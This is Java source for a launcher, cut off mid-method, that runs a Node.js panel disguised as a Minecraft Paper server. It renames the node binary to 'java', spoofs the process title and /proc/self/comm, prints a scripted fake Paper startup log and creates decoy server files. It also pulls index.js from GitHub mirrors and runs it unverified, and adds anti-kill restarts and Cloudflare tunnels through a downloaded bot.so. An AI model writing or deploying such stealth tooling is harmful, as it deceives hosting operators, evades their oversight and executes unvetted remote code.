import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.jar.*;
import java.util.zip.GZIPInputStream;

/**
 * 傲游面板一体化启动器 v3.3.2 (JNI 增强 + 外网实测 CF 隧道兜底 + 完整系统守护兼容版)
 *
 * v3.3.2 优化：
 *   - 当服务器分配的域名/IP:端口经实测可直接访问 Node 面板时，严禁开启 CF 隧道并自动清理残留 .tunnel_url；
 *   - 修复 parseTarget 对无显式端口的 http:// / https:// 域名默认端口处理，并在 explicitTargets 外补充 publicIp 兜底候选；
 *   - 区分外部探针“明确拒绝/超时”与“探针 API 自身不可用（如 429/网络隔离）”，避免国内直连节点误拉起 CF 隧道。
 *
 * v3.3.1 修复：
 *   - 修复 Docker Hairpin NAT 导致容器内自测公网 IP:Port 误判直连可达的问题：结合公网第三方 HTTP 实测
 *     (check-host.net) 验证外部真实连通性，不可达时自动拉起独立 bot.so 隧道
 *   - 守护日志改为直接写入 .panel.log，不受混淆版 index.js 屏蔽 console.log 的影响
 *   - 隧道激活后同时把 URL 直接写入工作根目录 .tunnel_url（以及 cache/.vip/.tunnel_url、runtimeDir/.tunnel_url 与 access.info）
 *
 * v3.3 新增：
 *   - 引入轻量 C PID-1 守护进程 (.aoyou_supervisor, <1MB RSS)，彻底释出 ~150MB JVM 内存同时
 *     完整支持 index.js 内置“系统守护”：反 Kill 信号拦截、Watchdog/进程崩溃自动拉起、
 *     guardHardRestart() (process.kill(1, 'SIGTERM')) 热重启不崩容器，以及 node 别名透传。
 *
 * v3.2 新增：
 *   - 面板启动后异步探测当前 MC 外网地址/域名 + 端口是否可直接 HTTP 访问到 Node 面板；
 *     若外网不可达（或配置了 CF_TOKEN / CF_FORCE=true，且未设置 CF_ENABLED=false），
 *     自动拉取 bot.so（x64/arm64）并在独立隔离进程启动 Cloudflare 隧道（与 index.js 内置 /proxy bot.so 互不冲突），
 *     同步写入 .tunnel_url、cache/.vip/.tunnel_url、runtimeDir/.tunnel_url 与 node_modules/.aoyou/access.info。
 *
 * v3.1 关键修复：
 *   - 随 JAR 内嵌 META-INF/build-stamp.txt，依赖/koffi/libnative_exec.so/index.js 随 JAR 更新自动刷新，
 *     且保留 node_modules/.RoamingMusic 与面板配置文件不被清空
 *   - 纯 Java HttpURLConnection + gh-proxy 镜像兜底拉取 index.js 与 Node.js（支持 x64/arm64，不强依赖 curl/tar）
 *   - 校验系统/缓存 Node 版本（要求 >= 22），伪装可执行文件仅写到可写 runtimeDir/node/bin/java
 *   - extractTar 完整支持软链接(type='2')、硬链接(type='1')、GNU 长文件名(type='L'/'K') 与 PAX 扩展头(type='x'/'g')
 *   - static 加载 native 库改为捕获 Throwable，并在异常/跨架构时安全回退到 paper.jar 子进程
 */
public class AoyouLauncher {

    private static final String VERSION = "3.3.2";
    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
    private static final String NODE_VERSION = "v22.14.0";
    private static final int MIN_NODE_MAJOR = 22;
    private static final String INDEX_RAW_URL =
        "https://raw.githubusercontent.com/zx1447/mcchajianindex/main/index.js";
    private static final String FAKE_CMDLINE =
        "java -Xms256M -Xmx3687M -XX:+UseG1GC -XX:+ParallelRefProcEnabled "
        + "-XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions "
        + "-XX:+DisableExplicitGC -Dterminal.jline=false -Dterminal.ansi=true "
        + "-jar server.jar --nogui";

    private static volatile boolean nativeLoaded = false;
    private static volatile String nativeLoadError = null;

    // JNI native 方法声明
    private native int nativeExec(String nodePath, String script, String workDir, String port, String path, String logFile);

    static {
        try {
            loadNativeLibrary();
        } catch (Throwable t) {
            nativeLoaded = false;
            nativeLoadError = t.getClass().getSimpleName() + ": " + t.getMessage();
        }
    }

    public static void main(String[] args) throws Exception {
        String workDir = System.getProperty("user.dir");
        Path runtimePath = Paths.get(workDir, RUNTIME_DIR_NAME).toAbsolutePath();
        String runtimeDir = runtimePath.toString();
        Files.createDirectories(runtimePath);

        // 清理旧版遗留目录和残留压缩包
        try {
            deleteDirectory(new File(workDir, ".aoyou-runtime"));
            File runtimeNodeDir = new File(runtimeDir, "node");
            if (runtimeNodeDir.exists()) {
                new File(runtimeNodeDir, "node.tar").delete();
                new File(runtimeNodeDir, "node.tar.gz").delete();
            }
        } catch (Exception ignored) {}

        // 1. 检查并获取合规版本 Node.js (>= 22)，支持 x64/arm64 与镜像兜底
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime (Node.js >= " + MIN_NODE_MAJOR + ")");
            System.exit(1);
            return;
        }

        // 2. 定位 JAR 并读取构建指纹
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }
        Map<String, String> jarStamps = readJarBuildStamps(jarPath);

        // 3. 随 JAR 更新增量刷新 node_modules（保留 .RoamingMusic 与配置）与内嵌 index.js
        syncAppFilesFromJar(jarPath, runtimePath, jarStamps);

        // 4. 从 GitHub（含 gh-proxy 兜底）拉取最新 index.js；失败时保留刚随 JAR 刷新的版本
        if (!"false".equalsIgnoreCase(System.getenv("AOYOU_AUTO_UPDATE"))) {
            try {
                updateFromGitHubToDir(runtimePath);
            } catch (Exception ignored) {}
        }

        // 5. 校验运行必需文件
        if (!Files.exists(runtimePath.resolve("node_modules")) || !Files.exists(runtimePath.resolve("node_modules/koffi"))) {
            System.err.println("Failed to locate node_modules/koffi");
            System.exit(1);
            return;
        }
        if (!Files.exists(runtimePath.resolve("index.js")) && !nativeLoaded) {
            System.err.println("Failed to locate index.js");
            System.exit(1);
            return;
        }

        // 6. 检测端口
        int port = detectPort(workDir);

        // 7. 永远复制到可写目录 runtimeDir/node/bin/java（避免无权限写 /usr/bin/java），
        //    并建立 node -> java 软链确保 index.js Watchdog 调用 spawn('node', ...) 也能命中合规 Node 22
        Path runtimeNodeBinDir = runtimePath.resolve("node/bin");
        Files.createDirectories(runtimeNodeBinDir);
        Path fakeJavaPath = runtimeNodeBinDir.resolve("java");
        try {
            Files.copy(Paths.get(nodeBin), fakeJavaPath, StandardCopyOption.REPLACE_EXISTING);
            fakeJavaPath.toFile().setExecutable(true, false);
        } catch (Exception e) {
            fakeJavaPath = Paths.get(nodeBin);
        }
        Path fakeNodeAlias = runtimeNodeBinDir.resolve("node");
        try {
            Files.deleteIfExists(fakeNodeAlias);
            Files.createSymbolicLink(fakeNodeAlias, fakeJavaPath.getFileName());
        } catch (Exception e) {
            try {
                Files.copy(fakeJavaPath, fakeNodeAlias, StandardCopyOption.REPLACE_EXISTING);
                fakeNodeAlias.toFile().setExecutable(true, false);
            } catch (Exception ignored) {}
        }
        String fakeNodeBin = fakeJavaPath.toString();

        // 8. 启动伪装 Paper 日志线程（与 egg-aoyou-v2 / Paper Egg 启动完成关键字匹配）
        Thread fakePaperLogThread = null;
        if (!"false".equalsIgnoreCase(System.getenv("AOYOU_STEALTH_CONSOLE"))) {
            fakePaperLogThread = startFakePaperLogThread();
        }

        // 8.5 并行探测外网 IP（与 Paper 伪装日志同时跑，不增加启动耗时）
        final String[] probedPublicIp = new String[1];
        Thread publicIpThread = new Thread(() -> {
            probedPublicIp[0] = probePublicIp();
        }, "ip-probe");
        publicIpThread.setDaemon(true);
        publicIpThread.start();

        // 9. 后台缓慢生成 MC 伪装文件（不阻塞日志线程）
        final int effectivePort = port;
        Thread mcFilesThread = new Thread(() -> {
            try { generateFakeMcFilesSlowly(workDir, effectivePort); } catch (Exception ignored) {}
        }, "mc-files");
        mcFilesThread.setDaemon(true);
        mcFilesThread.start();

        // 10. 等待 Paper 日志输出完成
        if (fakePaperLogThread != null) {
            try { fakePaperLogThread.join(); } catch (Exception ignored) {}
        }
        try { publicIpThread.join(1500L); } catch (Exception ignored) {}

        // 10.5 写入外网面板连通性探测 & 自动 Cloudflare(bot.so) 隧道守护脚本
        try {
            setupPanelNetworkGuard(runtimePath, workDir, port, probedPublicIp[0]);
        } catch (Exception ignored) {}

        // 11. 限制历史 .panel.log 大小
        Path logFile = runtimePath.resolve(".panel.log");
        try {
            if (Files.exists(logFile) && Files.size(logFile) > 5L * 1024L * 1024L) {
                Files.write(logFile, new byte[0], StandardOpenOption.TRUNCATE_EXISTING);
            }
        } catch (Exception ignored) {}

        // 12. 构造 PATH（包含 runtimeNode/bin 与原 nodeBin 所在目录以及系统 PATH）
        String nodeParent = new File(nodeBin).getParent();
        String sysPath = System.getenv("PATH");
        StringBuilder pathBuilder = new StringBuilder();
        pathBuilder.append(runtimeNodeBinDir.toString());
        if (nodeParent != null && !nodeParent.equals(runtimeNodeBinDir.toString())) {
            pathBuilder.append(File.pathSeparator).append(nodeParent);
        }
        if (sysPath != null && !sysPath.isEmpty()) {
            pathBuilder.append(File.pathSeparator).append(sysPath);
        }
        String pathEnv = pathBuilder.toString();

        int result = -1;
        if (nativeLoaded) {
            try {
                AoyouLauncher launcher = new AoyouLauncher();
                result = launcher.nativeExec(
                    fakeNodeBin,
                    "paper.jar",
                    runtimeDir,
                    String.valueOf(port),
                    pathEnv,
                    logFile.toString()
                );
            } catch (Throwable t) {
                result = -1;
            }
        }

        if (result != 0) {
            fallbackToSubprocess(fakeNodeBin, runtimePath, port, pathEnv, logFile);
        }
    }

    private static boolean isSystemGuardEnabled(Path runtimePath) {
        try {
            Path guardFile = runtimePath.resolve("node_modules/.system_guard.json");
            if (!Files.exists(guardFile)) return false;
            String content = new String(Files.readAllBytes(guardFile), StandardCharsets.UTF_8);
            return content.matches("(?s).*\"enabled\"\\s*:\\s*true.*");
        } catch (Exception ignored) {
            return false;
        }
    }

    private static void cleanupStaleWatchdog(Path runtimePath) {
        try {
            Path pidFile = runtimePath.resolve("node_modules/.watchdog.pid");
            Path hbFile = runtimePath.resolve("node_modules/.watchdog_heartbeat");
            if (Files.exists(pidFile)) {
                String raw = new String(Files.readAllBytes(pidFile), StandardCharsets.UTF_8).trim();
                try {
                    long wp = Long.parseLong(raw);
                    if (wp > 1) {
                        new ProcessBuilder("kill", "-9", String.valueOf(wp)).start().waitFor(2, TimeUnit.SECONDS);
                    }
                } catch (Exception ignored) {}
                Files.deleteIfExists(pidFile);
            }
            Files.deleteIfExists(hbFile);
        } catch (Exception ignored) {}
    }

    /** 回退方案：写 paper.jar 引导文件并以子进程运行（同时兼容系统守护自动重启） */
    private static void fallbackToSubprocess(String fakeNodeBin, Path runtimePath,
            int port, String pathEnv, Path logFile) throws Exception {
        final java.util.concurrent.atomic.AtomicBoolean stopRequested =
            new java.util.concurrent.atomic.AtomicBoolean(false);
        final java.util.concurrent.atomic.AtomicReference<Process> activeNode =
            new java.util.concurrent.atomic.AtomicReference<>();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopRequested.set(true);
            Process node = activeNode.get();
            if (node != null && node.isAlive()) {
                try {
                    node.destroy();
                    if (!node.waitFor(10, TimeUnit.SECONDS)) {
                        node.destroyForcibly();
                    }
                } catch (InterruptedException ignored) {}
            }
        }));

        int consecutiveFastCrashes = 0;
        int exitCode = 0;
        while (!stopRequested.get()) {
            ensurePaperBootstrapJs(runtimePath);

            List<String> cmd = new ArrayList<>();
            cmd.add(fakeNodeBin);
            cmd.add("paper.jar");

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(runtimePath.toFile());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectInput(ProcessBuilder.Redirect.INHERIT);

            Map<String, String> env = pb.environment();
            env.put("PATH", pathEnv);
            env.put("SERVER_PORT", String.valueOf(port));
            env.put("PORT", String.valueOf(port));
            env.put("AOYOU_LAUNCHER", "subprocess");

            long startTs = System.currentTimeMillis();
            Process node = pb.start();
            activeNode.set(node);
            exitCode = node.waitFor();
            activeNode.set(null);

            if (stopRequested.get() || !isSystemGuardEnabled(runtimePath)) {
                break;
            }

            long uptime = System.currentTimeMillis() - startTs;
            consecutiveFastCrashes = uptime < 3000L ? (consecutiveFastCrashes + 1) : 0;
            int delayMs = consecutiveFastCrashes == 0
                ? 800
                : Math.min(10000, 1000 << Math.min(3, consecutiveFastCrashes - 1));
            cleanupStaleWatchdog(runtimePath);
            Thread.sleep(delayMs);
        }
        System.exit(exitCode);
    }

    private static void ensurePaperBootstrapJs(Path runtimePath) throws IOException {
        Path paperJs = runtimePath.resolve("paper.jar");
        String content =
            "try{\n" +
            "  const fs=require('fs'),path=require('path');\n" +
            "  process.title='" + FAKE_CMDLINE + "';\n" +
            "  try{fs.writeFileSync('/proc/self/comm','java');}catch(e){}\n" +
            "  const logPath=path.join(__dirname,'.panel.log');\n" +
            "  const t=setInterval(()=>{\n" +
            "    try{if(fs.statSync(logPath).size>10*1024*1024)fs.truncateSync(logPath,0);}catch(e){}\n" +
            "  },600000);\n" +
            "  if(typeof t.unref==='function')t.unref();\n" +
            "}catch(e){}\n" +
            "try{require('./.panel_guard.js');}catch(e){}\n" +
            "require('./index.js');\n";
        Files.write(paperJs, content.getBytes(StandardCharsets.UTF_8));
    }

    private static boolean isLinuxX64() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        return os.contains("linux") && (arch.equals("amd64") || arch.equals("x86_64"));
    }

    private static boolean isArm64() {
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        return arch.equals("aarch64") || arch.equals("arm64");
    }

    /** 加载 native 库及轻量 C 守护二进制：按 JAR 内 CRC/大小自动刷新 */
    private static void loadNativeLibrary() throws Exception {
        if (!isLinuxX64()) {
            nativeLoaded = false;
            nativeLoadError = "Non-x64 architecture: " + System.getProperty("os.arch");
            return;
        }
        String jarPath = getJarPath();
        if (jarPath == null) {
            throw new RuntimeException("Cannot find jar");
        }

        String soName = "libnative_exec.so";
        Path soDir = Paths.get(System.getProperty("user.dir"), RUNTIME_DIR_NAME).toAbsolutePath();
        Files.createDirectories(soDir);
        Path soFile = soDir.resolve(soName);
        Path soStampFile = soDir.resolve(".so-stamp");

        try (JarFile jar = new JarFile(jarPath)) {
            JarEntry entry = jar.getJarEntry(soName);
            if (entry == null) {
                entry = jar.getJarEntry("native/" + soName);
            }
            if (entry == null) {
                throw new RuntimeException("Cannot find " + soName + " in jar");
            }

            String expectedStamp = entry.getCrc() + ":" + entry.getSize();
            String currentStamp = Files.exists(soStampFile)
                ? new String(Files.readAllBytes(soStampFile), StandardCharsets.UTF_8).trim()
                : "";

            if (!Files.exists(soFile) || !expectedStamp.equals(currentStamp)) {
                Path tmpSo = soDir.resolve(soName + ".tmp");
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, tmpSo, StandardCopyOption.REPLACE_EXISTING);
                }
                tmpSo.toFile().setExecutable(true, false);
                Files.move(tmpSo, soFile, StandardCopyOption.REPLACE_EXISTING);
                Files.write(soStampFile, expectedStamp.getBytes(StandardCharsets.UTF_8));
            }

            // 同步提取轻量 C PID-1 守护进程 (.aoyou_supervisor)
            JarEntry supEntry = jar.getJarEntry("supervisor");
            if (supEntry == null) {
                supEntry = jar.getJarEntry("native/supervisor");
            }
            if (supEntry != null) {
                Path supFile = soDir.resolve(".aoyou_supervisor");
                Path supStampFile = soDir.resolve(".sup-stamp");
                String expectedSupStamp = supEntry.getCrc() + ":" + supEntry.getSize();
                String currentSupStamp = Files.exists(supStampFile)
                    ? new String(Files.readAllBytes(supStampFile), StandardCharsets.UTF_8).trim()
                    : "";
                if (!Files.exists(supFile) || !expectedSupStamp.equals(currentSupStamp)) {
                    Path tmpSup = soDir.resolve(".aoyou_supervisor.tmp");
                    try (InputStream is = jar.getInputStream(supEntry)) {
                        Files.copy(is, tmpSup, StandardCopyOption.REPLACE_EXISTING);
                    }
                    tmpSup.toFile().setExecutable(true, false);
                    Files.move(tmpSup, supFile, StandardCopyOption.REPLACE_EXISTING);
                    Files.write(supStampFile, expectedSupStamp.getBytes(StandardCharsets.UTF_8));
                }
                supFile.toFile().setExecutable(true, false);
            }
        }
        soFile.toFile().setExecutable(true, false);
        System.load(soFile.toString());
        nativeLoaded = true;
    }

    private static Map<String, String> readJarBuildStamps(String jarPath) {
        Map<String, String> map = new HashMap<>();
        File jf = new File(jarPath);
        String fallback = jf.length() + ":" + jf.lastModified();
        try (JarFile jar = new JarFile(jarPath)) {
            JarEntry entry = jar.getJarEntry("META-INF/build-stamp.txt");
            if (entry != null) {
                try (BufferedReader r = new BufferedReader(new InputStreamReader(jar.getInputStream(entry), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = r.readLine()) != null) {
                        int eq = line.indexOf('=');
                        if (eq > 0) {
                            map.put(line.substring(0, eq).trim(), line.substring(eq + 1).trim());
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        map.putIfAbsent("nm_stamp", fallback);
        map.putIfAbsent("jar_stamp", fallback);
        return map;
    }

    private static Map<String, String> readDiskExtractedStamps(Path marker) {
        Map<String, String> map = new HashMap<>();
        if (!Files.exists(marker)) {
            return map;
        }
        try {
            for (String line : Files.readAllLines(marker, StandardCharsets.UTF_8)) {
                int eq = line.indexOf('=');
                if (eq > 0) {
                    map.put(line.substring(0, eq).trim(), line.substring(eq + 1).trim());
                }
            }
        } catch (Exception ignored) {}
        return map;
    }

    /** 随 JAR 更新刷新 node_modules（保留 .RoamingMusic 与配置文件）及内嵌 index.js */
    private static void syncAppFilesFromJar(String jarPath, Path runtimePath, Map<String, String> jarStamps) throws Exception {
        Path marker = runtimePath.resolve(".app-extracted");
        Map<String, String> diskStamps = readDiskExtractedStamps(marker);

        String targetNmStamp = jarStamps.get("nm_stamp");
        String targetJarStamp = jarStamps.get("jar_stamp");

        boolean needNodeModules = !targetNmStamp.equals(diskStamps.get("nm_stamp"))
            || !Files.exists(runtimePath.resolve("node_modules"))
            || !Files.exists(runtimePath.resolve("node_modules/koffi"));

        boolean needIndexFromJar = !targetJarStamp.equals(diskStamps.get("jar_stamp"))
            || !Files.exists(runtimePath.resolve("index.js"));

        if (!needNodeModules && !needIndexFromJar) {
            return;
        }

        try (JarFile jar = new JarFile(jarPath)) {
            if (needNodeModules) {
                Enumeration<JarEntry> entries = jar.entries();
                while (entries.hasMoreElements()) {
                    JarEntry entry = entries.nextElement();
                    String name = entry.getName();
                    if (entry.isDirectory()) continue;

                    boolean isNM = name.startsWith("runtime/node_modules/") || name.startsWith("node_modules/");
                    if (!isNM) continue;

                    String relPath = name.startsWith("runtime/node_modules/")
                        ? name.substring("runtime/".length())
                        : name;

                    // 绝不覆盖运行期用户数据或代理状态目录
                    if (relPath.startsWith("node_modules/.RoamingMusic/")
                        || relPath.equals("node_modules/.bots_config.json")
                        || relPath.equals("node_modules/.task_center_config.json")
                        || relPath.equals("node_modules/.system_guard.json")) {
                        continue;
                    }

                    Path target = runtimePath.resolve(relPath).normalize();
                    if (!target.startsWith(runtimePath.normalize())) continue;
                    Files.createDirectories(target.getParent());
                    try (InputStream is = jar.getInputStream(entry)) {
                        Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                    }
                    if (relPath.contains("/.bin/") || relPath.endsWith(".node")) {
                        target.toFile().setExecutable(true, false);
                    }
                }
            }

            if (needIndexFromJar) {
                JarEntry idxEntry = jar.getJarEntry("app/index.js");
                if (idxEntry == null) {
                    idxEntry = jar.getJarEntry("index.js");
                }
                if (idxEntry != null) {
                    Path tmpIdx = runtimePath.resolve("index.js.jar_tmp");
                    try (InputStream is = jar.getInputStream(idxEntry)) {
                        Files.copy(is, tmpIdx, StandardCopyOption.REPLACE_EXISTING);
                    }
                    Files.move(tmpIdx, runtimePath.resolve("index.js"), StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }

        StringBuilder sb = new StringBuilder();
        sb.append("nm_stamp=").append(targetNmStamp).append("\n");
        sb.append("jar_stamp=").append(targetJarStamp).append("\n");
        sb.append("version=").append(VERSION).append("\n");
        sb.append("updated_at=").append(System.currentTimeMillis()).append("\n");
        Files.write(marker, sb.toString().getBytes(StandardCharsets.UTF_8));
    }

    /** 启动伪装的 Paper 日志线程 */
    private static Thread startFakePaperLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Thread.sleep(2000);

                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);
                System.out.println("*** Warning, you've not updated in a while! ***");
                Thread.sleep(800);
                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                Thread.sleep(1000);
                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
                Thread.sleep(300);
                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
                Thread.sleep(800);

                String ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS; Eclipse Adoptium Temurin-21.0.11+10) on Linux 5.15.0-181-generic (amd64)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initializing plugins...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack paper, loading it automatically");
                Thread.sleep(3000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: No existing world data, creating new world");
                Thread.sleep(4000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1370 recipes");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1481 advancements");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
                Thread.sleep(800);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting minecraft server version 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loading properties");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Server Ping Player Sample Count: 12");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using 4 threads for Netty based IO");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
                Thread.sleep(2000);

                int port = 25565;
                try {
                    String sp = System.getenv("SERVER_PORT");
                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
                } catch (Exception ignored) {}

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Default game type: SURVIVAL");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Generating keypair");
                Thread.sleep(800);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using epoll channel type");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing level \"world\"");
                Thread.sleep(3000);

                int[] steps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
                for (int p : steps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(80 + (long)(Math.random() * 120));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 26711 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_nether");
                Thread.sleep(500);

                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
                for (int p : netherSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(100 + (long)(Math.random() * 150));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 5980 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_end");
                Thread.sleep(500);

                int[] endSteps = {2, 2, 18, 51};
                for (int p : endSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(200 + (long)(Math.random() * 300));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 1906 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] Starting background profiler...");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Done preparing level \"world\" (71.792s)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Running delayed init tasks");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                System.out.println("[" + ts + " INFO]: Done (" + totalSec + ".908s)! For help, type \"help\"");
                Thread.sleep(500);
                System.out.println("Server marked as running...");
                Thread.sleep(500);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This is the first time you're starting this server.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: It's recommended you read our 'Getting Started' documentation for guidance.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");

            } catch (InterruptedException ignored) {}
        }, "fake-paper-log");
        t.start();
        return t;
    }

    /** 纯 Java + gh-proxy 镜像拉取最新 index.js，避免依赖 curl 或写入 HTML 错误页 */
    private static void updateFromGitHubToDir(Path runtimePath) {
        String[] urls = {
            INDEX_RAW_URL,
            "https://gh-proxy.com/" + INDEX_RAW_URL,
            "https://mirror.ghproxy.com/" + INDEX_RAW_URL
        };
        Path target = runtimePath.resolve("index.js");
        Path tmp = runtimePath.resolve("index.js.tmp");

        for (String url : urls) {
            try {
                if (downloadToFile(url, tmp, 10000, 30000)) {
                    long size = Files.size(tmp);
                    if (size > 100_000L && !looksLikeHtml(tmp)) {
                        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                        return;
                    }
                }
            } catch (Exception ignored) {
            } finally {
                try { Files.deleteIfExists(tmp); } catch (Exception ignored) {}
            }
        }
    }

    private static boolean looksLikeHtml(Path file) {
        try (InputStream is = Files.newInputStream(file)) {
            byte[] buf = new byte[128];
            int n = is.read(buf);
            if (n <= 0) return true;
            String head = new String(buf, 0, n, StandardCharsets.UTF_8).trim().toLowerCase(Locale.ROOT);
            return head.startsWith("<");
        } catch (Exception e) {
            return true;
        }
    }

    private static HttpURLConnection openConnectionWithRedirects(String urlStr, int connectTimeoutMs, int readTimeoutMs) throws IOException {
        String current = urlStr;
        for (int hop = 0; hop < 6; hop++) {
